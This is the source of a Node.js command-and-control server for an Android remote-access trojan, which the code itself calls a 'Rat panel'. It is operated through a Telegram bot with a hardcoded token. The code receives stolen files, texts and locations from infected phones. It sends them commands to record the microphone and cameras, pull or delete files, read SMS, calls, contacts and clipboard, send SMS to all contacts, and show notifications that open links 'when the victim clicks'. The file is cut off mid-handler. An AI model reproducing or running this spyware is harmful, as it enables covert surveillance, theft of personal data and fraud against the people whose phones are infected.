const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '8655471570:AAFMYkqo8JRGIWEULUsoLfg7lSOARoT3WfI';
const id = '6383817850';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true}); // Polling wapas laga di
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true })); // Added for better POST handling

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// --- ROMEO UCHIHA THEME ---
const ROMEO_HEADER = "🩸 <b>𝙍𝙤𝙢𝙚𝙤 𝙐𝙘𝙝𝙞𝙝𝙖 (𝙎𝙝𝙖𝙧𝙞𝙣𝙜𝙖𝙣)</b> 👁️\n\n";
const LOADING_MSG = ROMEO_HEADER + "🌀 <b>𝙎𝙝𝙖𝙧𝙞𝙣𝙜𝙖𝙣 𝘼𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙...</b>\n\n°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ";

app.get('/', function (req, res) {
    res.send('<body style="background-color:black; color:red; font-family:sans-serif;"><h1 align="center">🩸 𝙍𝙤𝙢𝙚𝙤 𝙐𝙘𝙝𝙞𝙝𝙖 𝙎𝙚𝙧𝙫𝙚𝙧 𝘼𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙 👁️</h1> <br> <p style="font-size:14px; text-align:center; color:#ff3333;">T.G Channel➩ <a href="https://youtube.com/@zerodarknexus" style="color:red;">@ZeroHackNexus</a></p></body>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    if (!req.file) return res.send(''); // Safely handle empty files
    const name = req.file.originalname || 'unknown_file';
    const model = req.headers.model || 'Unknown Device';
    
    appBot.sendDocument(id, req.file.buffer, {
            caption: ROMEO_HEADER + `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: req.file.mimetype || 'application/octet-stream', // Dynamic mime type fix
        }).catch(err => console.log(err.message));
    res.send('')
})

app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'Unknown Device';
    const textBody = req.body['text'] || 'Empty';
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + textBody, {parse_mode: "HTML"}).catch(err => console.log(err.message));
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'Unknown Device';
    if(req.body['lat'] && req.body['lon']) {
        appBot.sendLocation(id, req.body['lat'], req.body['lon']).catch(err => console.log(err.message));
    }
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"}).catch(err => console.log(err.message));
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model || 'Unknown Device'
    const battery = req.headers.battery || 'N/A'
    const version = req.headers.version || 'N/A'
    const brightness = req.headers.brightness || 'N/A'
    const provider = req.headers.provider || 'N/A'

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    
    ws.on('error', (e) => console.log('WS Error:', e.message)); // Railway stability

    appBot.sendMessage(id,
        ROMEO_HEADER +
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    ).catch(err => console.log(err.message));

    ws.on('close', function () {
        appBot.sendMessage(id,
            ROMEO_HEADER +
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        ).catch(err => console.log(err.message));
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                ROMEO_HEADER +
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            ).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`send_message:${currentNumber}/${message.text}`) } catch(e){}
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`send_message_to_all:${message_to_all}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`file:${path}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`delete_file:${path}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`microphone:${duration}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`rec_camera_main:${duration}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`rec_camera_selfie:${duration}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`toast:${toastMessage}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                ROMEO_HEADER +
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            ).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`show_notification:${currentTitle}/${link}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    try { ws.send(`play_audio:${audioLink}`) } catch(e){}
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, LOADING_MSG, {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }).catch(e => console.log(e))
        }
    }
    
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                ROMEO_HEADER +
                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(e => console.log(e))
        }
        if (message.text == '🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️' || message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    ROMEO_HEADER +
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ',
                    {parse_mode: "HTML"}
                ).catch(e => console.log(e))
            } else {
                let text = ROMEO_HEADER + '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"}).catch(e => console.log(e))
            }
        }
        if (message.text == '⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙' || message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    ROMEO_HEADER +
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ',
                    {parse_mode: "HTML"}
                ).catch(e => console.log(e))
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    // MAIN FIX FOR 400 BAD REQUEST ERROR
                    deviceListKeyboard.push([{
                        text: value.model || 'Unknown Device',
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                    parse_mode: "HTML"
                }).catch(e => console.log(e))
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙').catch(e => console.log(e))
    }
})

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    
    if (commend == 'device') {
        const selectedClient = appClients.get(data.split(':')[1]);
        const finalModelName = selectedClient ? selectedClient.model : 'Unknown Device';
        
        appBot.editMessageText(ROMEO_HEADER + `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${finalModelName}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        }).catch(e => console.log(e))
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('calls'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
